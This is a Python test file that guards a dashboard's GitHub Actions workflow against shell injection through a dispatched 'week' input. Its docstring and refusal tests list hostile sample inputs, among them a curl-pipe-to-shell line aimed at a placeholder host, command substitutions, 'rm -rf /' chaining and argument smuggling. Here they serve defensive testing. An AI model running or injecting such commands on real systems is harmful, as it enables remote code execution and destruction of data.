"""Workflow inputs are data, and the dashboard's week input proves it.

`${{ inputs.week }}` written inside a `run:` block is expanded by the runner
BEFORE the shell parses the script, so whatever was typed into the dispatch
box is spliced into a command line. `3; curl evil.sh | sh` is a legal string
in that box. The repository is private and only the owner can dispatch it,
which lowers the odds and changes nothing about the mechanism.

Two things are pinned here. First, textually: no `run:` block in any workflow
may contain a `${{ ... }}` expansion at all — the same check a workflow
linter makes, kept in the suite so it runs on every change rather than when
somebody remembers. Values reach a script through `env:`, where the runner
puts them in the environment instead of in the command. Second, behaviourally:
the validator the dashboard actually uses refuses everything that is not a
bare in-range integer, and echoes the offending text as a quoted value.

No YAML parser is used. The property is about the file's TEXT, and pyyaml is
not a declared dependency of this project.
"""
from __future__ import annotations

import importlib.util
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
EXPANSION = re.compile(r"\$\{\{")


def _load(name: str, rel: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / rel)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


CLI = _load("workflow_dashboard_cli", "scripts/weekly/dashboard.py")


def _run_blocks(text: str) -> list[tuple[int, str]]:
    """Every `run:` script in a workflow, as (line number, script).

    Indentation-scoped: the block is the rest of the `run:` line plus every
    following line indented deeper than it (blank lines carry through).
    """
    lines = text.splitlines()
    blocks: list[tuple[int, str]] = []
    i = 0
    while i < len(lines):
        m = re.match(r"^(\s*)run:(.*)$", lines[i])
        if not m:
            i += 1
            continue
        indent, rest = len(m.group(1)), m.group(2).strip()
        body = [] if rest in ("|", ">", "|-", ">-", "") else [rest]
        start = i + 1
        j = start
        while j < len(lines):
            line = lines[j]
            if line.strip() and (len(line) - len(line.lstrip())) <= indent:
                break
            body.append(line)
            j += 1
        blocks.append((i + 1, "\n".join(body)))
        i = j
    return blocks


def test_the_workflows_have_run_blocks_to_check():
    assert WORKFLOWS, "no workflows found — this test would pass vacuously"
    found = sum(len(_run_blocks(w.read_text("utf-8"))) for w in WORKFLOWS)
    assert found >= 5, f"only {found} run blocks parsed; the parser is wrong"


@pytest.mark.parametrize("workflow", WORKFLOWS, ids=lambda p: p.name)
def test_no_workflow_expands_an_expression_inside_a_shell_script(workflow):
    offenders = [(n, b) for n, b in _run_blocks(workflow.read_text("utf-8"))
                 if EXPANSION.search(b)]
    assert not offenders, (
        f"{workflow.name}: `${{{{ ... }}}}` inside a run: block at line(s) "
        f"{[n for n, _ in offenders]} — the runner substitutes it before the "
        f"shell parses the script. Pass the value through `env:` instead.")


def test_the_dispatched_week_reaches_python_through_the_environment():
    text = (ROOT / ".github" / "workflows" / "dashboard-artifact.yml").read_text("utf-8")
    assert "GRIDIRON_WEEK: ${{ inputs.week }}" in text, \
        "the week input must be bound to an env var, not spliced into a command"
    assert CLI.WEEK_ENV == "GRIDIRON_WEEK"
    # and the render command itself is a constant string
    render = next(b for _n, b in _run_blocks(text) if "weekly/dashboard.py" in b)
    assert render.strip() == "python scripts/weekly/dashboard.py --write"


# ----------------------------------------------------------- the validator

@pytest.mark.parametrize("raw", ["", "   ", None])
def test_no_week_given_means_no_week(raw):
    assert CLI.week_from_env(raw) is None


@pytest.mark.parametrize("raw,want", [("1", 1), ("3", 3), ("18", 18), ("22", 22),
                                      ("03", 3), (" 7 ", 7), ("3\n", 3)])
def test_a_plain_in_range_integer_is_the_only_thing_accepted(raw, want):
    assert CLI.week_from_env(raw) == want


@pytest.mark.parametrize("raw", [
    "3; curl evil.sh | sh",       # command chaining
    "$(whoami)",                  # command substitution
    "`id`",                       # backtick substitution
    "3 && rm -rf /",              # conditional chaining
    "3 | tee /etc/passwd",        # pipe
    "3\nrm -rf /",                # newline injection
    "--week=3 --archive-root=/", # argument smuggling
    "0", "-1", "23", "999",       # out of range
    "1e3", "3.0", "0x3", "three", "٣",   # not a plain ASCII integer
])
def test_everything_else_is_refused_as_data(raw):
    with pytest.raises(SystemExit) as exc:
        CLI.week_from_env(raw)
    message = str(exc.value)
    assert "REFUSING" in message
    # the offending text is echoed as a quoted value, never bare
    assert repr(raw) in message or "outside weeks" in message


def test_a_refused_week_stops_the_run_rather_than_falling_back():
    """Falling back to the snapshot's week would render a confident page for
    a week nobody asked for, off an input that was already malformed."""
    with pytest.raises(SystemExit):
        CLI.week_from_env("3; rm -rf /")
